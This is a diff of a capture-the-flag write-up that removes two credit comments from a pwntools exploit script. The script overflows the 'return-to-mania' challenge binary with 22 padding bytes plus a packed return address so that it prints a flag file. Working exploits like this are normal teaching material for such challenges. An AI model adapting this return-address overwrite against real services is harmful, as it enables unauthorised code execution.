@@ -39,7 +39,7 @@ Bingo. That's what we want. It tried to open a '`flag.txt`', which means on the 
 I then proceeded to use good old <a href='https://github.com/Gallopsled/pwntools'>pwntools</a> to start making my hack. Its a bit messy, so I added some comments to help. This was my final code.
 ```
 from pwn import *
-context.log_level = 'debug'               #debug mode, so I can see exactly what my code is doing. Suggested by kcolley
+context.log_level = 'debug'               #debug mode, so I can see exactly what my code is doing.
 r = remote('ret.sunshinectf.org',4301)    #connect to the service
 #r = process('./return-to-mania')         #comment out above line and uncomment this one to test locally
 data = r.recvuntil('\n')                  #receive the first line, but I don't care about it so...
@@ -58,7 +58,7 @@ print target                              #debug print
 
 target = p32(target, endian='little')     #convert the integer into a 32 bit architecture little endian address
 print target                              #debug print, should print utf-8 encoded hex (often has unprintables)
-r.sendline('a'*22+target)                 #send the exploit on over! Thanks to kcolley for suggesting sendline and not just send
+r.sendline('a'*22+target)                 #send the exploit on over!
 print r.recv()                            #print the first line, had no flag so:
 print r.recv()                            #print next line (flag)
 ```
